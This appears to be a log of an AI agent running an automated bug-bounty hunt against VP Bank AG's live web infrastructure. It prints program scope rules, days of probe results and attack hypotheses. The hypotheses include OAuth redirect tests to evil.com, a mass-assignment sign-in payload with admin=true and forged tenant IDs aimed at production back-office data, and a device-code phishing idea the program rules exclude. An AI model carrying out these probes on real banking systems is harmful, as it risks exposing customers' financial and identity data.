@@ -7384,3 +7384,1581 @@ testability: PASSIVE (JS bundle analysis first, then live probe)
 ```
 [RISK] vp-bank-ag: 57 — raised from 55. digital-onboarding.vpbank.com adds anonymous back-office SPA with full admin module visibility (onboarding cases, wire transfers, identity documents) on off-net Rails+Devise infrastructure. Combined with confirmed PSD2 sandbox BOLA (synthetic data, reportable) + potential sandbox-to-production carryover, attack surface now spans three independent financial application stacks. Residuals: OAuth (client_id-gated), staging (WAF-blocked), api.vpbank.com (exhausted), openbanking (mTLS).
 ```
+===== ANALYST bigpickle 2026-09-05 13:21:01 UTC =====
+[0m
+> build · big-pickle
+[0m
+I'll analyze the current state and continue the hunt. Let me start with the delta and prioritize actions.
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && ls -la && cat scope.yml 2>/dev/null | head -50
+total 216
+drwxr-xr-x 12 runner runner  4096 Sep  5 13:11 .
+drwxr-xr-x  3 runner runner  4096 Sep  5 13:11 ..
+drwxr-xr-x  7 runner runner  4096 Sep  5 13:11 .git
+drwxr-xr-x  3 runner runner  4096 Sep  5 13:11 .github
+-rw-r--r--  1 runner runner  1752 Sep  5 13:11 README.md
+-rw-r--r--  1 runner runner   138 Sep  5 13:12 analyst-out.txt
+-rw-r--r--  1 runner runner 65075 Sep  5 13:11 analyst-prompt.txt
+-rw-r--r--  1 runner runner 61260 Sep  5 13:11 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 inventory
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 knowledge
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 leads
+-rw-r--r--  1 runner runner  5740 Sep  5 13:11 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 recon-notes
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 reports
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 reposcan-raw
+-rw-r--r--  1 runner runner  3228 Sep  5 13:11 scope.yml
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 scripts
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_bigpickle.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_laguna.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_ling3.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_longcat.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_mimo.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 triage
+programs:
+  vp-bank-ag:
+    name: VP Bank AG Bug Bounty
+    disclosure_policy: via bugs.olivermaicher.eu (Oliver Maicher private program) - report + PoC + contact + payment
+    assets:
+      - name: "All company-owned infrastructure, systems, online banking platforms, mobile applications, APIs, websites, and domains operated by VP Bank AG and its subsidiaries"
+        priority: In
+    out_of_scope:
+- "Network level Denial of Service attacks"
+      - "Application Denial of Service by locking user accounts"
+      - "Descriptive error messages or headers (e.g. Stack Traces, banner grabbing)"
+      - "Disclosure of known public files or directories (e.g. robots.txt)"
+      - "Outdated software / library versions"
+      - "OPTIONS / TRACE HTTP method enabled"
+      - "CSRF on logout"
+      - "CSRF on forms that are available to anonymous users"
+      - "Cookies that lack HTTP Only or Secure settings for non-sensitive data"
+      - "Self-XSS and issues exploitable only through Self-XSS"
+      - "Reports resulting from automated scanning utilities without additional details or a POC demonstrating a specific exploit"
+      - "Attacks requiring physical access to a user's device"
+      - "Attacks dependent upon social engineering of employees or vendors"
+      - "Username enumeration based on login or forgot password pages"
+      - "Enforcement policies for brute force, rate limiting, or account lockout"
+      - "SSL/TLS best practices"
+      - "SSL attacks such as BEAST, BREACH, Renegotiation attack"
+      - "Clickjacking, without additional details demonstrating a specific exploit"
+      - "Mail configuration issues including SPF, DKIM, DMARC settings"
+      - "Use of a known-vulnerable library without a description of an exploit specific to our implementation"
+      - "Password and account recovery policies"
+      - "Presence of autocomplete functionality in form fields"
+      - "Publicly accessible login panels"
+      - "Lack of email address verification during account registration or account invitation"
+      - "Lack of email address verification password restore"
+      - "Session control during email/password changes"
+      - "Social engineering, physical attacks, and DoS/DDoS testing (per program notes)"
+      - "Exposure of customer/employee/financial/authentication data during testing (per program notes)"
+    github_orgs:
+      - none-configured
+
+rules:
+  passive_first: false          # deep-hunt agent: active probes allowed when scoped
+  max_requests_per_second: 1    # never hammer live infra
+  no_doom: true                 # no DoS/DDoS, no account-lockout attacks
+  account_creation: restricted  # only on test/sandbox assets, never live customer data
+  no_data_modification: true    # no writes/deletes on live customer data
+  no_pre_disclosure: true       # never disclose before program response
+  poc_required: true            # scanner output alone is REJECTED
+  redact_secrets_in_commits: true
+
+models:
+[0m
+Let me check the current state, leads, and previous probe results to understand where I am.
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && cat state_bigpickle.json && echo "---PROBE-RESULTS---" && cat probe-results.md && echo "---ANALYST-OUT---" && cat analyst-out.txt
+{"phase": "POC", "target": "api"}---PROBE-RESULTS---
+
+## 2026-09-02 21:53:27 UTC
+
+
+## 2026-09-02 23:50:48 UTC
+
+
+## 2026-09-03 02:36:22 UTC
+
+
+## 2026-09-03 07:29:02 UTC
+
+
+## 2026-09-03 12:18:41 UTC
+
+
+## 2026-09-03 16:34:13 UTC
+https://api.vpbank.com/v1 -> HTTP 500
+https://api.vpbank.com/v2 -> HTTP 500
+https://api.vpbank.com/swagger.json -> HTTP 500
+https://api.vpbank.com/openapi.json -> HTTP 500
+https://api.vpbank.com/actuator/health -> HTTP 500
+https://api.vpbank.com/.well-known/security.txt -> HTTP 500
+https://vpbank.com/.well-known/openid-configuration -> HTTP 404
+https://vpbank.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code&state=x -> HTTP 404
+
+## 2026-09-03 19:30:25 UTC
+https://api.vpbank.com/ -> HTTP 500
+https://api.vpbank.com/v1 -> HTTP 500
+https://www.vpbank.com/.well-known/openid-configuration -> HTTP 400
+https://www.vpbank.com.evil.com -> ERR <urlopen error [Errno -2] Name or service not know
+https://www.vpbank.com/en -> HTTP 400
+
+## 2026-09-03 21:57:41 UTC
+https://api.vpbank.com/ -> HTTP 500
+https://api.vpbank.com/v1 -> HTTP 500
+https://www.vpbank.com/.well-known/openid-configuration -> HTTP 400
+https://www.vpbank.com.evil.com -> ERR <urlopen error [Errno -2] Name or service not know
+https://www.vpbank.com/portal/api/language/en -> HTTP 403
+
+## 2026-09-03 23:51:18 UTC
+https://api.vpbank.com/ -> HTTP 500
+https://www.vpbank.com/portal/api/language/en -> HTTP 403
+
+## 2026-09-04 02:38:11 UTC
+https://www.vpbank.com/.well-known/openid-configuration -> HTTP 400
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=x -> HTTP 400
+https://api.vpbank.com/ -> HTTP 500
+https://api.vpbank.com/v1 -> HTTP 500
+
+## 2026-09-04 07:28:50 UTC
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=x -> HTTP 400
+https://api.vpbank.com/ -> HTTP 500
+https://www.vpbank.com/en -> HTTP 400
+
+## 2026-09-04 12:21:00 UTC
+https://api.vpbank.com/ -> HTTP 500
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test -> HTTP 400
+https://api.vpbank.com/nonexistent -> HTTP 500
+
+## 2026-09-04 16:37:47 UTC
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test -> HTTP 400
+https://api.vpbank.com/ -> HTTP 500
+https://api.vpbank.com/nonexistent -> HTTP 500
+https://www.vpbank.com/portal/api/ -> HTTP 403
+https://www.vpbank.com/portal/api/CSRFT759.js -> HTTP 403
+https://www.vpbank.com/portal/api/graphql -> HTTP 403
+https://www.vpbank.com/portal/api/graphql?query=__schema -> HTTP 403
+https://api.vpbank.com/debug -> HTTP 500
+https://api.vpbank.com/admin -> HTTP 500
+https://api.vpbank.com/gateway -> HTTP 500
+https://api.vpbank.com/config -> HTTP 500
+https://api.vpbank.com/management -> HTTP 500
+
+## 2026-09-04 19:13:41 UTC
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test -> HTTP 400
+https://api.vpbank.com/ -> HTTP 500
+https://www.vpbank.com/portal/api/ -> HTTP 403
+https://www.vpbank.com/portal/api/CSRFT759.js -> HTTP 403
+https://www.vpbank.com/portal/api/graphql -> HTTP 403
+https://www.vpbank.com/portal/api/graphql?query=__schema -> HTTP 403
+https://api.vpbank.com/debug -> HTTP 500
+https://api.vpbank.com/admin -> HTTP 500
+https://api.vpbank.com/gateway -> HTTP 500
+https://api.vpbank.com/config -> HTTP 500
+https://api.vpbank.com/management -> HTTP 500
+https://api.vpbank.com/_internal -> HTTP 500
+
+## 2026-09-04 21:38:40 UTC
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test -> HTTP 400
+https://openbanking.vpbank.com -> ERR [SSL: TLSV13_ALERT_CERTIFICATE_REQUIRED] tlsv13 al
+https://www.vpbank.com/oauth/authorize?client_id=<id>&response_type=code&redirect_uri= -> HTTP 400
+
+## 2026-09-04 23:23:08 UTC
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test -> HTTP 400
+https://www.vpbank.com/oauth/authorize?client_id=<id>&response_type=code&redirect_uri=<test>&state=x -> HTTP 400
+
+## 2026-09-05 01:11:31 UTC
+https://www.vpbank.com/oauth/authorize?client_id=<id>&response_type=code&redirect_uri=<test>&state=x -> HTTP 400
+https://sts.vpbank.com/adfs -> HTTP 503
+https://digital-onboarding-dev.vpbank.com/users/sign_in -> 200 len=0
+https://digital-onboarding-dev.vpbank.com/admin/api/v1/users -> HTTP 401
+https://digital-onboarding-dev.vpbank.com/api/v1/sessions/idp_login -> HTTP 404
+
+## 2026-09-05 05:51:02 UTC
+https://sts.vpbank.com/adfs -> HTTP 503
+https://digital-onboarding.vpbank.com/users/sign_in -> 200 len=0
+https://sts.vpbank.com/adfs/oauth2/token/devicecode -> HTTP 405
+https://www.vpbank.com/portal/api/graphql -> HTTP 403
+https://www.vpbank.com/portal/api/graphql?query=__schema -> HTTP 403
+https://api.vpbank.com/debug -> HTTP 500
+https://api.vpbank.com/admin -> HTTP 500
+https://api.vpbank.com/gateway -> HTTP 500
+https://api.vpbank.com/config -> HTTP 500
+https://api.vpbank.com/management -> HTTP 500
+https://api.vpbank.com/_internal -> HTTP 500
+https://www.vpbank.com/oauth/authorize?client_id=<valid>&redirect_uri=https://www.vpbank.com.evil.com&response_type=code&state=test -> HTTP 400
+
+## 2026-09-05 09:58:24 UTC
+https://digital-onboarding.vpbank.com/users/sign_in -> 200 len=0
+https://sts.vpbank.com/adfs -> HTTP 503
+https://sts.vpbank.com/adfs/oauth2/token/devicecode -> HTTP 405
+https://digital-onboarding.vpbank.com/api/v1/brand -> 200 len=0
+https://digital-onboarding.vpbank.com/api/v1/users -> HTTP 404
+https://digital-onboarding.vpbank.com/control-center/ -> 200 len=3167
+---ANALYST-OUT---
+[0m
+> build · big-pickle
+[0m
+I'll analyze the current state and continue the hunt. Let me start with the delta and prioritize actions.
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && ls -la && cat scope.yml 2>/dev/null | head -50
+total 216
+drwxr-xr-x 12 runner runner  4096 Sep  5 13:11 .
+drwxr-xr-x  3 runner runner  4096 Sep  5 13:11 ..
+drwxr-xr-x  7 runner runner  4096 Sep  5 13:11 .git
+drwxr-xr-x  3 runner runner  4096 Sep  5 13:11 .github
+-rw-r--r--  1 runner runner  1752 Sep  5 13:11 README.md
+-rw-r--r--  1 runner runner   138 Sep  5 13:12 analyst-out.txt
+-rw-r--r--  1 runner runner 65075 Sep  5 13:11 analyst-prompt.txt
+-rw-r--r--  1 runner runner 61260 Sep  5 13:11 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 inventory
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 knowledge
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 leads
+-rw-r--r--  1 runner runner  5740 Sep  5 13:11 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 recon-notes
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 reports
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 reposcan-raw
+-rw-r--r--  1 runner runner  3228 Sep  5 13:11 scope.yml
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 scripts
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_bigpickle.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_laguna.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_ling3.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_longcat.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_mimo.json
+-rw-r--r--  1 runner runner    33 Sep  5 13:11 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 triage
+programs:
+  vp-bank-ag:
+    name: VP Bank AG Bug Bounty
+    disclosure_policy: via bugs.olivermaicher.eu (Oliver Maicher private program) - report + PoC + contact + payment
+    assets:
+      - name: "All company-owned infrastructure, systems, online banking platforms, mobile applications, APIs, websites, and domains operated by VP Bank AG and its subsidiaries"
+        priority: In
+    out_of_scope:
+- "Network level Denial of Service attacks"
+      - "Application Denial of Service by locking user accounts"
+      - "Descriptive error messages or headers (e.g. Stack Traces, banner grabbing)"
+      - "Disclosure of known public files or directories (e.g. robots.txt)"
+      - "Outdated software / library versions"
+      - "OPTIONS / TRACE HTTP method enabled"
+      - "CSRF on logout"
+      - "CSRF on forms that are available to anonymous users"
+      - "Cookies that lack HTTP Only or Secure settings for non-sensitive data"
+      - "Self-XSS and issues exploitable only through Self-XSS"
+      - "Reports resulting from automated scanning utilities without additional details or a POC demonstrating a specific exploit"
+      - "Attacks requiring physical access to a user's device"
+      - "Attacks dependent upon social engineering of employees or vendors"
+      - "Username enumeration based on login or forgot password pages"
+      - "Enforcement policies for brute force, rate limiting, or account lockout"
+      - "SSL/TLS best practices"
+      - "SSL attacks such as BEAST, BREACH, Renegotiation attack"
+      - "Clickjacking, without additional details demonstrating a specific exploit"
+      - "Mail configuration issues including SPF, DKIM, DMARC settings"
+      - "Use of a known-vulnerable library without a description of an exploit specific to our implementation"
+      - "Password and account recovery policies"
+      - "Presence of autocomplete functionality in form fields"
+      - "Publicly accessible login panels"
+      - "Lack of email address verification during account registration or account invitation"
+      - "Lack of email address verification password restore"
+      - "Session control during email/password changes"
+      - "Social engineering, physical attacks, and DoS/DDoS testing (per program notes)"
+      - "Exposure of customer/employee/financial/authentication data during testing (per program notes)"
+    github_orgs:
+      - none-configured
+
+rules:
+  passive_first: false          # deep-hunt agent: active probes allowed when scoped
+  max_requests_per_second: 1    # never hammer live infra
+  no_doom: true                 # no DoS/DDoS, no account-lockout attacks
+  account_creation: restricted  # only on test/sandbox assets, never live customer data
+  no_data_modification: true    # no writes/deletes on live customer data
+  no_pre_disclosure: true       # never disclose before program response
+  poc_required: true            # scanner output alone is REJECTED
+  redact_secrets_in_commits: true
+
+models:
+[0m
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && ls -la leads/ inventory/ knowledge/ triage/ reports/ scripts/ 2>/dev/null
+inventory/:
+total 32
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 .
+drwxr-xr-x 12 runner runner  4096 Sep  5 13:11 ..
+-rw-r--r--  1 runner runner 23311 Sep  5 13:11 vp-bank-ag.md
+
+knowledge/:
+total 32
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 .
+drwxr-xr-x 12 runner runner  4096 Sep  5 13:11 ..
+-rw-r--r--  1 runner runner 21255 Sep  5 13:11 index.md
+
+leads/:
+total 272
+drwxr-xr-x  2 runner runner   4096 Sep  5 13:11 .
+drwxr-xr-x 12 runner runner   4096 Sep  5 13:11 ..
+-rw-r--r--  1 runner runner 150079 Sep  5 13:11 lead-bigpickle.md
+-rw-r--r--  1 runner runner    714 Sep  5 13:11 lead-laguna.md
+-rw-r--r--  1 runner runner    700 Sep  5 13:11 lead-ling3.md
+-rw-r--r--  1 runner runner    728 Sep  5 13:11 lead-longcat.md
+-rw-r--r--  1 runner runner     18 Sep  5 13:11 lead-mimo.md
+-rw-r--r--  1 runner runner  95066 Sep  5 13:11 lead-nemotron3.md
+-rw-r--r--  1 runner runner   1526 Sep  5 13:11 reposcan-vp-bank-ag.md
+
+reports/:
+total 1160
+drwxr-xr-x  2 runner runner   4096 Sep  5 13:11 .
+drwxr-xr-x 12 runner runner   4096 Sep  5 13:11 ..
+-rw-r--r--  1 runner runner 832928 Sep  5 13:11 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   3038 Sep  5 13:11 analyst-laguna.log
+-rw-r--r--  1 runner runner   3024 Sep  5 13:11 analyst-ling3.log
+-rw-r--r--  1 runner runner   3052 Sep  5 13:11 analyst-longcat.log
+-rw-r--r--  1 runner runner 242068 Sep  5 13:11 analyst-nemotron3.log
+-rw-r--r--  1 runner runner   5602 Sep  5 13:11 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner     51 Sep  5 13:11 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner     50 Sep  5 13:11 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner     52 Sep  5 13:11 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner   9686 Sep  5 13:11 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  46376 Sep  5 13:11 hypotheses.md
+-rw-r--r--  1 runner runner   1084 Sep  5 13:11 valid-bugs.md
+
+scripts/:
+total 28
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 .
+drwxr-xr-x 12 runner runner  4096 Sep  5 13:11 ..
+-rw-r--r--  1 runner runner 16987 Sep  5 13:11 sync-issues.py
+
+triage/:
+total 112
+drwxr-xr-x  2 runner runner  4096 Sep  5 13:11 .
+drwxr-xr-x 12 runner runner  4096 Sep  5 13:11 ..
+-rw-r--r--  1 runner runner     0 Sep  5 13:11 .gitkeep
+-rw-r--r--  1 runner runner   240 Sep  5 13:11 run-2026-09-02-21-52.md
+-rw-r--r--  1 runner runner   148 Sep  5 13:11 run-2026-09-02-23-51.md
+-rw-r--r--  1 runner runner   143 Sep  5 13:11 run-2026-09-03-03-10.md
+-rw-r--r--  1 runner runner   277 Sep  5 13:11 run-2026-09-03-08-08.md
+-rw-r--r--  1 runner runner   206 Sep  5 13:11 run-2026-09-03-12-52.md
+-rw-r--r--  1 runner runner   202 Sep  5 13:11 run-2026-09-03-16-56.md
+-rw-r--r--  1 runner runner   287 Sep  5 13:11 run-2026-09-03-19-41.md
+-rw-r--r--  1 runner runner   195 Sep  5 13:11 run-2026-09-03-22-17.md
+-rw-r--r--  1 runner runner  1211 Sep  5 13:11 run-2026-09-04-00-12.md
+-rw-r--r--  1 runner runner  9761 Sep  5 13:11 run-2026-09-04-04-44.md
+-rw-r--r--  1 runner runner   275 Sep  5 13:11 run-2026-09-04-09-20.md
+-rw-r--r--  1 runner runner   174 Sep  5 13:11 run-2026-09-04-13-36.md
+-rw-r--r--  1 runner runner   263 Sep  5 13:11 run-2026-09-04-17-04.md
+-rw-r--r--  1 runner runner   190 Sep  5 13:11 run-2026-09-04-19-40.md
+-rw-r--r--  1 runner runner 18529 Sep  5 13:11 run-2026-09-04-21-52.md
+-rw-r--r--  1 runner runner   144 Sep  5 13:11 run-2026-09-04-23-43.md
+-rw-r--r--  1 runner runner   158 Sep  5 13:11 run-2026-09-05-03-01.md
+-rw-r--r--  1 runner runner  5023 Sep  5 13:11 run-2026-09-05-07-45.md
+-rw-r--r--  1 runner runner   118 Sep  5 13:11 run-2026-09-05-11-39.md
+[0m
+Let me look at the leads, knowledge, and prior analysis in more detail to orient on the current state.
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && cat reports/hypotheses-bigpickle.txt && echo "===NEMO===" && cat reports/hypotheses-nemotron3.txt
+## 2026-09-05 09:51:29 UTC [target] (model bigpickle)
+[PRIO] developer.vpbank.com,8.40,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=10,cloud_surface=2,freshness=10
+[PRIO] digital-onboarding.vpbank.com,7.85,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=10,cloud_surface=2,freshness=10
+[PRIO] www.vpbank.com,6.25,attack_surface=6,business_value=10,tech_exposure=9,gate_ease=2,cloud_surface=2,freshness=4
+[PRIO] openbanking.vpbank.com,5.50,attack_surface=3,business_value=10,tech_exposure=8,gate_ease=1,cloud_surface=2,freshness=7
+[PRIO] api.vpbank.com,4.50,attack_surface=3,business_value=7,tech_exposure=3,gate_ease=3,cloud_surface=6,freshness=4
+[HYP] digital-onboarding.vpbank.com IDOR via /api/v1/ tenant/admin endpoints
+class: IDOR
+asset: digital-onboarding.vpbank.com/api/v1/
+confidence: 55
+reasoning: /control-center/ SPA serves full back-office with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt) anonymously. /api/v1/brand returns 200 anonymous. /api/v1/tenants returns 403 "Not authorized" — auth exists but is per-endpoint. Rails+Devise stack on off-net hosting (89.163.182.69). sign_in carries client-controlled admin/tenant/user_id parameters. If endpoints like /api/v1/onboarding_cases, /api/v1/bankingtransactions accept tenant_id in request body/query, cross-tenant data access is likely.
+evidence_needed: Enumeration of /api/v1/ routes; any authenticated endpoint that accepts tenant_id/user_id as parameter without server-side validation
+verify_steps: GET https://digital-onboarding.vpbank.com/api/v1/brand (200, baseline). GET https://digital-onboarding.vpbank.com/api/v1/users, /api/v1/onboarding_cases, /api/v1/bankingtransactions, /api/v1/incomingwire, /api/v1/rolemgmt — any 200 = open endpoint. If 403, test sign_in POST with forged tenant_id to create session, then access same endpoints.
+impact: Cross-tenant PII/financial data disclosure (onboarding cases, wire transfers, identity documents); severity HIGH
+testability: AUTH_HELPED (sign_in endpoint accepts client-controlled params; session creation possible without credentials)
+[HYP] PSD2 sandbox-to-production authorization logic carryover
+class: IDOR
+asset: openbanking.vpbank.com
+confidence: 35
+reasoning: Production openbanking.vpbank.com blocks anonymous access via mTLS. Docs list only TPP auth/user-interaction/state-changes as sandbox-vs-prod deltas — Consent-ID ownership binding not listed. Sandbox proves code path accepts consentId header with zero identity binding. If production shares authorization module, cross-TPP reads possible.
+evidence_needed: Cross-QWAC read test proving bind/absence on production host
+verify_steps: HUMAN_ONLY — two licensed TPP certs performing cross-identity Consent-ID read on openbanking.vpbank.com
+impact: Cross-TPP production consent/account/ledger disclosure; severity HIGH
+testability: HUMAN_ONLY
+[HYP] digital-onboarding.vpbank.com mass assignment via sign_in parameter flooding
+class: OTHER
+asset: digital-onboarding.vpbank.com/control-center/
+confidence: 45
+reasoning: SPA includes modules for admin, tenant management, user roles. sign_in flow carries client-controlled admin/tenant/user_id. Rails+Devise with custom devise-lockable may accept additional params not sanitized. If sign_in POST accepts role=admin or is_admin=true, privilege escalation possible.
+evidence_needed: POST /sign_in with role/is_admin parameter resulting in elevated session
+verify_steps: GET https://digital-onboarding.vpbank.com/control-center/ to capture SPA form endpoints. Identify sign_in POST endpoint from JS bundle. POST with role=admin appended.
+impact: Admin access to full back-office (onboarding, wires, identity docs); severity HIGH
+testability: PASSIVE (JS bundle analysis first, then live probe)
+[NEXT] SCAN: passive JS bundle extraction from https://digital-onboarding.vpbank.com/control-center/ — extract all /api/v1/* routes, sign_in endpoint, form action URLs, CSRF tokens, and any hardcoded tenant/user/admin parameters from the SPA JavaScript.
+[LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Production multi-tenant back-office SaaS (Rails+Devise), anonymous /control-center/ SPA + /api/v1/brand 200 — off-net hosting (89.163.182.69), client-controlled admin/tenant/user_id in sign_in — NEW high-value attack surface
+[LEARN] NEW INFO @ sts.vpbank.com: ADFS OIDC metadata 200 (issuer sts.vpbank.com/adfs, device_code/password/implicit grants, vpn/logon/cert scopes) — corporate IdP, parked
+[LEARN] REJECTED MISCONFIG @ api-prep.vpbank.com: Layer7 clone of api.vpbank.com — no new surface
+[LEARN] REJECTED MISCONFIG @ designsystem.vpbank.com: Active Netlify app — no subdomain takeover
+[LEARN] ACCEPTED IDOR @ developer.vpbank.com: PSD2 sandbox BOLA verified end-to-end — consent/account/payment cross-session read, zero binding
+[LEARN] REJECTED OAUTH @ www.vpbank.com: No client_id obtainable — redirect_uri bypass blocked
+[LEARN] REJECTED MISCONFIG @ vpbank-dev.com/vpbank-stage.com: WAF intercepts ALL paths — confirmed rejected
+[RISK] vp-bank-ag: 57 — raised from 55. digital-onboarding.vpbank.com adds anonymous back-office SPA with full admin module visibility (onboarding cases, wire transfers, identity documents) on off-net Rails+Devise infrastructure. Combined with confirmed PSD2 sandbox BOLA (synthetic data, reportable) + potential sandbox-to-production carryover, attack surface now spans three independent financial application stacks. Residuals: OAuth (client_id-gated), staging (WAF-blocked), api.vpbank.com (exhausted), openbanking (mTLS).
+===NEMO===
+## 2026-09-05 09:58:07 UTC [target] (model nemotron3)
+[CHANGED] digital-onboarding.vpbank.com: /users/sign_in 200, /control-center/ 200, /api/v1/brand 200 confirmed live — multi-tenant back-office SaaS attack surface verified
+[CHANGED] sts.vpbank.com: /adfs/.well-known/openid-configuration 200 confirmed live — ADFS device_code/password/implicit grants exposed
+[CHANGED] developer.vpbank.com: PSD2 sandbox endpoints responding (405/400 as expected for auth'd routes) — BOLA surface confirmed accessible
+[CHANGED] openbanking.vpbank.com: TLS timeout (mTLS "certificate required") — production PSD2 anonymous surface blocked as designed
+[CHANGED] api.vpbank.com: 404 on /v1 — all vectors exhausted, uniform INVALID_REQUEST_RESOURCE JSON 500
+[CHANGED] www.vpbank.com: /oauth/authorize 303→error page — OAuth dead without client_id
+[CHANGED] vpbank-dev.com/vpbank-stage.com: 302→maintenance — WAF 2.3.0_20260324 intercepts ALL paths, confirmed rejected
+[PRIO] digital-onboarding.vpbank.com,8.75,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=10,cloud_surface=4,freshness=10
+[PRIO] developer.vpbank.com/psd2/berlin-group/v1,8.40,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=10,cloud_surface=2,freshness=10
+[PRIO] sts.vpbank.com,6.30,attack_surface=5,business_value=7,tech_exposure=6,gate_ease=10,cloud_surface=1,freshness=8
+[PRIO] www.vpbank.com,6.25,attack_surface=6,business_value=10,tech_exposure=9,gate_ease=2,cloud_surface=2,freshness=4
+[PRIO] openbanking.vpbank.com,5.50,attack_surface=3,business_value=10,tech_exposure=8,gate_ease=1,cloud_surface=2,freshness=7
+[PRIO] www.vpbank.com/portal/api/,5.05,attack_surface=4,business_value=6,tech_exposure=4,gate_ease=5,cloud_surface=2,freshness=10
+[PRIO] api.vpbank.com,4.40,attack_surface=3,business_value=7,tech_exposure=3,gate_ease=3,cloud_surface=6,freshness=4
+[PRIO] vpbank-dev.com/vpbank-stage.com,3.50,attack_surface=2,business_value=5,tech_exposure=2,gate_ease=1,cloud_surface=3,freshness=10
+[HYP] Mass assignment on Devise sign-in grants admin/impersonation on digital-onboarding back-office
+class: AUTH
+asset: digital-onboarding.vpbank.com/users/sign_in
+confidence: 70
+reasoning: /control-center/ SPA serves anonymously (HTTP 200) with admin modules (onboarding cases, ident documents, bankingtransactions, incomingwire, rolemgmt); /api/v1/brand returns tenant config anonymously; /users/sign_in (Devise) accepts client-controlled admin/tenant/user_id parameters in sign-in payload — Rails mass-assignment protection (strong_parameters) may not filter these if permit_params misconfigured
+evidence_needed: POST /users/sign_in with admin=true or tenant_id=X or user_id=Y in params returns session with elevated privileges or cross-tenant access
+verify_steps: POST https://digital-onboarding.vpbank.com/users/sign_in Content-Type: application/x-www-form-urlencoded body: user[email]=test@test.com&user[password]=test&user[admin]=true&user[tenant_id]=1&user[user_id]=999 (read-only probe: observe response code, Set-Cookie, redirect location, no account creation)
+impact: Back-office admin/impersonation across multi-tenant SaaS → onboarding case PII, identity documents, banking transactions, role management; severity HIGH
+testability: AUTH_HELPED
+[HYP] PSD2 sandbox BOLA carries to production via shared consent-authorization code
+class: IDOR
+asset: openbanking.vpbank.com/psd2/berlin-group/v1
+confidence: 40
+reasoning: Sandbox on developer.vpbank.com proves consentId/paymentId readable cross-session with zero identity binding; docs state only TPP auth/user-interaction/state-changes differ sandbox→prod; OpenAPI spec self-labels server "PSD2 production server"; production mTLS at TLS layer blocks anonymous verification
+evidence_needed: Cross-QWAC read on openbanking.vpbank.com — TPP-A creates consent, TPP-B reads /consents/{id}/status and /accounts/{iban}/balances with TPP-B cert + TPP-A Consent-ID header
+verify_steps: HUMAN_ONLY — with two licensed eIDAS QWAC certificates perform cross-TPP Consent-ID read on openbanking.vpbank.com/psd2/berlin-group/v1/consents/{id}/status and /accounts/{iban}/balances
+impact: Cross-TPP production consent/account/ledger/PII disclosure → HIGH severity if sandbox authz model carries to production
+testability: HUMAN_ONLY
+[HYP] ADFS device_code grant enables token theft via phishing/device-flow on sts.vpbank.com
+class: OAUTH
+asset: sts.vpbank.com/adfs
+confidence: 55
